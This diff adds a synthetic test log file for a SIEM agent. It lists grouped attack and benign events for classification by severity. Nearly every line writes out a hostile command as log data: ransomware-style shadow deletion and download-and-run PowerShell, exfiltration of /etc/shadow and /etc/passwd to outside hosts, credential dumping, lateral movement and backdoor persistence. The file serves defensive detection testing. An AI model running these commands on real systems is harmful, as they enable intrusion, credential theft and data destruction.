@@ -1,0 +1,51 @@
+# SIEM Agent Test Log File — Mixed severity events
+# Upload this file via the UI to classify all events at once
+
+# === SSH Brute Force ===
+Jan 15 10:30:00 webserver01 sshd[1234]: Failed password for root from 45.33.32.156 port 22 ssh2
+Jan 15 10:30:02 webserver01 sshd[1234]: Failed password for root from 45.33.32.156 port 22 ssh2
+Jan 15 10:30:04 webserver01 sshd[1234]: Failed password for admin from 45.33.32.156 port 22 ssh2
+Jan 15 10:30:06 webserver01 sshd[1234]: Failed password for ubuntu from 45.33.32.156 port 22 ssh2
+Jan 15 10:30:08 webserver01 sshd[1234]: Failed password for oracle from 45.33.32.156 port 22 ssh2
+
+# === Ransomware / Destructive (P1) ===
+Jan 15 10:31:00 winserver01 cmd[9999]: vssadmin.exe delete shadows /all /quiet
+Jan 15 10:31:05 winserver01 powershell[8888]: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.1/ransom.ps1')
+Jan 15 10:31:10 winserver01 powershell[8888]: Set-MpPreference -DisableRealtimeMonitoring $true
+
+# === Web Attacks (P2-P3) ===
+Jan 15 10:32:00 webserver01 nginx[5678]: GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1 200
+Jan 15 10:32:05 webserver01 nginx[5678]: POST /login.php HTTP/1.1 200 - "sqlmap/1.7.8#stable (https://sqlmap.org)"
+Jan 15 10:32:10 webserver01 nginx[5678]: GET /?id=1' UNION SELECT username,password FROM users-- HTTP/1.1 200
+Jan 15 10:32:15 webserver01 nginx[5678]: GET /etc/passwd HTTP/1.1 200 0
+
+# === Privilege Escalation (P2) ===
+Jan 15 10:33:00 appserver01 sudo[3456]: hacker : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+Jan 15 10:33:10 appserver01 sudo[3456]: www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/sh
+
+# === Lateral Movement (P2) ===
+Jan 15 10:34:00 workstation01 smbclient[7890]: net use \\192.168.1.50\C$ /user:DOMAIN\administrator P@ssw0rd
+Jan 15 10:34:05 workstation01 cmd[7891]: psexec.exe \\192.168.1.50 -u administrator -p P@ssw0rd cmd.exe
+
+# === Data Exfiltration (P2) ===
+Jan 15 10:35:00 dbserver01 bash[2222]: scp -r /etc/shadow root@185.220.101.1:/tmp/loot
+Jan 15 10:35:10 dbserver01 curl[2223]: curl -X POST https://pastebin.com/api/api_post.php -d 'api_paste_code=/etc/passwd'
+
+# === Recon / Scanning (P3) ===
+Jan 15 10:36:00 attacker01 nmap[4444]: nmap -sS -p 1-65535 -T4 10.0.0.0/24
+Jan 15 10:36:30 firewall01 kernel[0]: DROP TCP 203.0.113.1:4444->10.0.1.5:443 SYN
+
+# === Credential Access (P3) ===
+Jan 15 10:37:00 winserver01 mimikatz[6666]: sekurlsa::logonpasswords
+Jan 15 10:37:05 winserver01 reg[6667]: reg save HKLM\SAM C:\Windows\Temp\sam.hive
+
+# === Persistence (P3) ===
+Jan 15 10:38:00 workstation01 schtasks[5555]: schtasks /create /tn "updater" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru SYSTEM
+Jan 15 10:38:10 linuxbox01 crontab[1111]: echo "* * * * * /tmp/.hidden/shell.sh" | crontab -
+
+# === Benign / Info (P5) ===
+Jan 15 10:39:00 cron01 CRON[1111]: CMD (/usr/local/bin/backup.sh)
+Jan 15 10:39:10 webserver01 nginx[5678]: GET /health HTTP/1.1 200 12
+Jan 15 10:39:20 appserver01 systemd[1]: Started Daily apt download and install activities.
+Jan 15 10:39:30 dbserver01 postgres[9012]: LOG: database system is ready to accept connections
+Jan 15 10:39:40 monitor01 nagios[3333]: SERVICE OK: Disk Usage at 42%
